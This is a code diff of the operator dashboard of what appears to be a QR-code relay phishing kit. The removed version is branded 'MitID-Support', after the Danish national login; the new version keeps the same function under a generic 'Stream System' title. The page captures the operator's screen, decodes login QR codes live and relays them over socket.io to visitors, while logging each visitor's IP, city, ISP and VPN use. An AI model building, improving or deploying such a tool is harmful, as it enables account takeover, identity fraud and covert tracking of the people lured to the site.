@@ -1,123 +1,224 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Admin Panel - Support QR</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard - Stream System</title>
   <script src="/socket.io/socket.io.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
   <style>
-    body{background:#f8f9fa;}
-    .container{max-width:1100px;}
-    #debugLog{background:#eee;padding:10px;height:200px;overflow:auto;font-size:13px;}
-    .muted-row{color:#6c757d;}
+    body {
+      font-family: system-ui, sans-serif;
+      background: #fafafa;
+      margin: 0;
+      padding: 1rem;
+      color: #333;
+    }
+    h2 {
+      margin-top: 0;
+      text-align: center;
+    }
+    .controls {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
+    }
+    button {
+      padding: 0.6rem 1rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      background: #0078ff;
+      color: white;
+      font-weight: bold;
+      transition: 0.2s;
+    }
+    button:hover { opacity: 0.9; }
+    #clients {
+      width: 100%;
+      max-width: 800px;
+      margin: 1rem auto;
+      border-collapse: collapse;
+    }
+    #clients th, #clients td {
+      padding: 8px;
+      border-bottom: 1px solid #ddd;
+      font-size: 0.9rem;
+    }
+    #clients th { background: #f0f0f0; }
+    #qrPreview, #video {
+      display: block;
+      margin: 1rem auto;
+      border: 2px dashed #ccc;
+      border-radius: 8px;
+    }
+    #qrPreview {
+      width: 160px;
+      height: 160px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: white;
+    }
+    #log {
+      max-width: 800px;
+      margin: 1rem auto;
+      padding: 0.5rem;
+      border: 1px solid #ddd;
+      height: 150px;
+      overflow-y: auto;
+      background: #fff;
+      font-size: 0.85rem;
+    }
+    .status {
+      text-align: center;
+      font-size: 0.9rem;
+      margin-bottom: 1rem;
+    }
   </style>
 </head>
 <body>
-  <div class="container my-4">
-    <div class="d-flex align-items-center mb-3">
-      <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="logo" style="width:50px;margin-right:12px;">
-      <h3 class="m-0">MitID-Support — Admin Panel</h3>
-    </div>
+  <h2>Admin Dashboard</h2>
 
-    <div class="alert alert-info">
-      Users navigate to: <strong><span id="siteUrl"></span></strong>
-    </div>
-
-    <div class="mb-3">
-      <button id="start" class="btn btn-success">Start Stream</button>
-      <button id="stop" class="btn btn-danger">Stop Stream</button>
-      <button id="hide" class="btn btn-warning">Hide QR</button>
-      <button id="show" class="btn btn-info">Show QR</button>
-      <button id="freeze" class="btn btn-secondary">Freeze Scan</button>
-      <button id="unfreeze" class="btn btn-light">Unfreeze Scan</button>
-    </div>
-
-    <p>Status: <span id="status">Idle</span> | Hidden: <span id="hiddenStatus">No</span> | Frozen: <span id="frozenStatus">No</span> | Ping: <span id="adminPing">0</span>ms</p>
-
-    <h5>Connected Clients (<span id="clientCount">0</span>)</h5>
-    <div style="max-height:250px;overflow-y:auto;">
-      <table class="table table-striped table-sm">
-        <thead class="table-dark">
-          <tr><th>User</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN/VPS</th><th>Ping</th></tr>
-        </thead>
-        <tbody id="clientListBody"></tbody>
-      </table>
-    </div>
-
-    <h5>QR Preview</h5>
-    <div id="qrCanvas"></div>
-    <h5 class="mt-3">Screen Capture Preview</h5>
-    <video id="video" width="640" height="360" autoplay style="border:1px solid #ccc"></video>
-    <canvas id="canvas" style="display:none"></canvas>
-    <h5 class="mt-3">Debug Log</h5>
-    <div id="debugLog"></div>
+  <div class="status">
+    <p>Hidden: <span id="hiddenStatus">No</span> | Streaming: <span id="streamStatus">No</span></p>
   </div>
 
-<script>
-(() => {
-  const socket = io();
-  socket.emit('join','admin');
-  document.getElementById('siteUrl').textContent = window.location.origin;
-  const qrCanvasDiv = document.getElementById('qrCanvas');
-  const clientListBody = document.getElementById('clientListBody');
-  const log = (m)=>{const p=document.createElement('p');p.textContent=new Date().toLocaleTimeString()+" - "+m;debugLog.appendChild(p);debugLog.scrollTop=debugLog.scrollHeight;}
-  let stream=null, interval=null, lastQr=null, isHidden=false;
+  <div class="controls">
+    <button id="start">Start Stream</button>
+    <button id="stop">Stop Stream</button>
+    <button id="hide">Hide QR</button>
+    <button id="show">Show QR</button>
+  </div>
 
-  document.getElementById('start').onclick=startStream;
-  document.getElementById('stop').onclick=stopStream;
-  document.getElementById('hide').onclick=()=>toggleHide(true);
-  document.getElementById('show').onclick=()=>toggleHide(false);
+  <div id="qrPreview"><p>No QR yet</p></div>
+  <video id="video" width="480" height="270" autoplay muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-  socket.on('client_list',list=>{
-    clientListBody.innerHTML='';
-    clientCount.textContent=list.length;
-    list.forEach(c=>{
-      const tr=document.createElement('tr');
-      if(/Not logged/.test(c.username))tr.classList.add('muted-row');
-      tr.innerHTML=`<td>${c.username}</td><td>${c.ip}</td><td>${c.city}</td><td>${c.region}</td><td>${c.countryFlag||''} ${c.country}</td><td>${c.isp}</td><td>${c.vpn?'✅':'❌'}</td><td>${c.ping||''}</td>`;
-      clientListBody.appendChild(tr);
-    });
-  });
+  <table id="clients">
+    <thead>
+      <tr>
+        <th>User</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN</th><th>Ping</th>
+      </tr>
+    </thead>
+    <tbody id="clientListBody"></tbody>
+  </table>
 
-  socket.on('qr_preview',v=>{
-    qrCanvasDiv.innerHTML='';
-    if(v&&!isHidden)new QRCode(qrCanvasDiv,{text:v,width:128,height:128});
-  });
-  socket.on('hide_state',h=>{isHidden=h;qrCanvasDiv.innerHTML='';if(!h&&lastQr)new QRCode(qrCanvasDiv,{text:lastQr,width:128,height:128});});
+  <div id="log"></div>
 
-  async function startStream(){
-    try{
-      stream=await navigator.mediaDevices.getDisplayMedia({video:true});
-      video.srcObject=stream;video.muted=true;await video.play();
-      interval=setInterval(scan,500);
-      socket.emit('start_stream');log('Stream started');
-    }catch(e){log('Error: '+e.message);}
-  }
-  function stopStream(){
-    if(stream)stream.getTracks().forEach(t=>t.stop());
-    clearInterval(interval);interval=null;stream=null;
-    socket.emit('stop_stream');log('Stream stopped');
-  }
-  function toggleHide(h){isHidden=h;socket.emit('toggle_hide',h);}
-  function scan(){
-    if(!video.videoWidth)return;
-    const c=canvas,ctx=c.getContext('2d');
-    c.width=video.videoWidth;c.height=video.videoHeight;
-    ctx.drawImage(video,0,0,c.width,c.height);
-    const img=ctx.getImageData(0,0,c.width,c.height);
-    const code=jsQR(img.data,img.width,img.height);
-    if(code&&code.data!==lastQr){
-      lastQr=code.data;
-      socket.emit('qr_update',code.data);
-      qrCanvasDiv.innerHTML='';
-      if(!isHidden)new QRCode(qrCanvasDiv,{text:code.data,width:128,height:128});
-      log('Detected: '+code.data);
+  <script>
+    const socket = io();
+    socket.emit('join', 'admin');
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const qrPreview = document.getElementById('qrPreview');
+    const clientListBody = document.getElementById('clientListBody');
+    const logEl = document.getElementById('log');
+    const hiddenStatus = document.getElementById('hiddenStatus');
+    const streamStatus = document.getElementById('streamStatus');
+
+    let stream = null, detecting = false, isHidden = false, lastQR = null;
+
+    const log = (msg) => {
+      const p = document.createElement('div');
+      p.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
+      logEl.appendChild(p);
+      logEl.scrollTop = logEl.scrollHeight;
+    };
+
+    document.getElementById('start').onclick = async () => {
+      try {
+        stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        video.srcObject = stream;
+        detecting = true;
+        detectLoop();
+        socket.emit('start_stream');
+        streamStatus.textContent = 'Yes';
+        log('Started screen sharing');
+      } catch (err) {
+        log('Error starting stream: ' + err.message);
+      }
+    };
+
+    document.getElementById('stop').onclick = () => {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+        detecting = false;
+        socket.emit('stop_stream');
+        qrPreview.innerHTML = '<p>No QR yet</p>';
+        streamStatus.textContent = 'No';
+        log('Stream stopped');
+      }
+    };
+
+    document.getElementById('hide').onclick = () => toggleHide(true);
+    document.getElementById('show').onclick = () => toggleHide(false);
+
+    function toggleHide(h) {
+      isHidden = h;
+      socket.emit('toggle_hide', h);
+      hiddenStatus.textContent = h ? 'Yes' : 'No';
+      hiddenStatus.style.color = h ? 'red' : 'green';
+      log('Hide toggled: ' + h);
     }
-  }
-})();
-</script>
+
+    function detectLoop() {
+      if (!detecting || !stream) return;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 360;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      const code = jsQR(imgData.data, imgData.width, imgData.height);
+      if (code && code.data && code.data !== lastQR) {
+        lastQR = code.data;
+        log('QR detected: ' + code.data);
+        socket.emit('qr_update', code.data);
+        if (!isHidden) {
+          qrPreview.innerHTML = '';
+          new QRCode(qrPreview, { text: code.data, width: 160, height: 160 });
+        }
+      }
+      requestAnimationFrame(detectLoop);
+    }
+
+    socket.on('client_list', (list) => {
+      clientListBody.innerHTML = '';
+      list.forEach(c => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${c.username}</td>
+          <td>${c.ip || '-'}</td>
+          <td>${c.city || '-'}</td>
+          <td>${c.region || '-'}</td>
+          <td>${c.country || '-'}</td>
+          <td>${c.isp || '-'}</td>
+          <td>${c.vpn ? '✅' : '❌'}</td>
+          <td>${c.ping || '-'}</td>
+        `;
+        clientListBody.appendChild(tr);
+      });
+    });
+
+    socket.on('qr_preview', (v) => {
+      qrPreview.innerHTML = '';
+      if (v && !isHidden) new QRCode(qrPreview, { text: v, width: 160, height: 160 });
+    });
+
+    socket.on('hide_state', (h) => {
+      isHidden = h;
+      hiddenStatus.textContent = h ? 'Yes' : 'No';
+      hiddenStatus.style.color = h ? 'red' : 'green';
+      if (h) qrPreview.innerHTML = '<p>Hidden</p>';
+    });
+
+    socket.on('error', (msg) => log('Error: ' + msg));
+    socket.on('ping', (t) => socket.emit('pong', t));
+  </script>
 </body>
 </html>
